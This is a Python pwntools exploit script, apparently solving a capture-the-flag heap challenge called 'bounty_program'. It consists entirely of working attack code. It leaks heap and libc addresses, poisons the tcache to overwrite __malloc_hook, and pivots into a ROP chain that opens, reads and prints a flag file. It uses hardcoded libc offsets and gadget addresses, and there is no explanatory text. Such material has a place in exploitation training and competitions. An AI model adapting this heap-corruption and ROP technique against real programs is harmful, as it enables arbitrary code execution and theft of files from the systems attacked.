from pwn import *

r = process('./bounty_program')

context.arch = 'amd64'

# 0x1f name
# 0xf passwd

def regist(name, passwd, contact):
    r.sendlineafter(':', '2')
    r.sendafter(':', name)
    r.sendafter(':', passwd)
    r.sendafter(':', contact)

def login(name, passwd):
    r.sendlineafter(':', '1')
    r.sendafter(':', name)
    r.sendafter(':', passwd)

def new_pass(passwd):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', passwd)

def add_product(name, company, comment):
    r.sendlineafter(':', '1')
    r.sendafter(':', name)
    r.sendafter(':', company)
    r.sendafter(':', comment)

def add_type(sz, tp, price, no_price = 0):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(sz))
    r.sendlineafter(':', tp)
    if no_price == 1:
        r.recvuntil('Type:')
        return
    r.sendlineafter(':', str(price))
    r.recvuntil('Success')
def submit_report(product_id, tp, title, report_id, desc_len, desc):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(product_id))
    r.sendlineafter(':', str(tp))
    r.sendlineafter(':', title)
    r.sendlineafter(':', str(report_id))
    r.sendlineafter(':', str(desc_len))
    r.sendafter(':', desc)

def delete_report(product, BUG):
    r.sendlineafter(':', '8')
    r.sendlineafter(':', str(product))
    r.sendlineafter(':', str(BUG))
    r.recvuntil('Done')

def delete_type(sz, tp):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(sz))
    r.sendlineafter('Type:', tp)


regist('A', 'A', 'A')
login('A', 'A')

#login bounty
r.sendlineafter(':', '1')
add_product('b', 'b', 'b')

for i in range(6):
    add_type(0x100, 'GG', 10)
    delete_type(10, 'GG')

r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x100)) # size
r.sendlineafter(':', '\x00') # type
r.recvuntil('type')

r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x10000000000)) # size
r.recvuntil('type: ')
heap = u64(r.recvn(6).ljust(8,'\x00')) - 0xcd0
print('heap:', hex(heap))
r.sendlineafter(':', '10')

r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x100))
r.sendlineafter(':', '\x00')
r.recvuntil('type')

add_type(0x100, 'TT', 10)
add_type(0x100, 'AA', 10)
r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x100))
r.sendlineafter(':', '\x00')
r.recvuntil('type')
r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x10000000000))
r.recvuntil('type: ')
libc = u64(r.recvn(6).ljust(8,'\x00')) - 0x3ebda0
print('libc:', hex(libc))
r.sendlineafter(':', '10')
delete_type(10,'TT')
delete_type(10,'AA')

offset = 0x20000 - (heap&0xff00)
for i in range(5):
    add_type(0x50, 'NN', 10)
    delete_type(10, 'NN')

submit_report(0, 'RCE', '123', 0, offset-0x16f0, '1')


add_type(0x408, '\x00', 10, 1)
add_type(0x408, '\x00', 10, 1)

submit_report(0, 'RCE', '123', 1, 0x2c00-0x590, '1')

add_type(0x50, 'NN', 10)
delete_type(10, 'NN')
add_type(0x50, 'NN', 10)
delete_type(10, 'NN')

# overwrite tcache fd
r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x50))
r.sendlineafter(':', '\x00')
r.recvuntil('Type:')
r.sendlineafter(':', '2')
r.sendlineafter(':', str(0x10000000000))
r.sendlineafter('Price:', '10')
r.sendlineafter('Price:', '10')

# logout
r.sendlineafter(':', '0')
r.sendlineafter(':', '7')

# register
malloc_hook = 0x3ebc30
regist('C', 'C', 'C')
regist('C',p64(libc+malloc_hook), 'C')

#login bounty
login('A', 'A')
r.sendlineafter(':', '1')

leave_ret = libc+0x54803
pop_rdi = libc+0x2155f
pop_rsi = libc+0x23e6a
pop_rdx = libc+0x1b96
pop_rax = libc+0x439c8
syscall_ret = libc+0xd2975

target_heap = heap+0x16020

raw_input('#')
submit_report(0, 'RCE', '123', 4, 0x408, flat(pop_rdi, target_heap+0x3e0, pop_rsi, 0, pop_rax, 2,syscall_ret, pop_rdi, 4, pop_rsi, heap+0x200, pop_rdx, 0x100, pop_rax, 0, syscall_ret, pop_rdi, 1, pop_rax, 1, syscall_ret ).ljust(0x3e0, '\x00') + '/home/bounty_program/flag\x00' )
raw_input('#')
submit_report(0, 'RCE', '123', 2, 0x408, p64(leave_ret))

# ROP gogo
r.sendlineafter(':', '2')
r.sendlineafter(':', str(target_heap-0x8))

r.interactive()
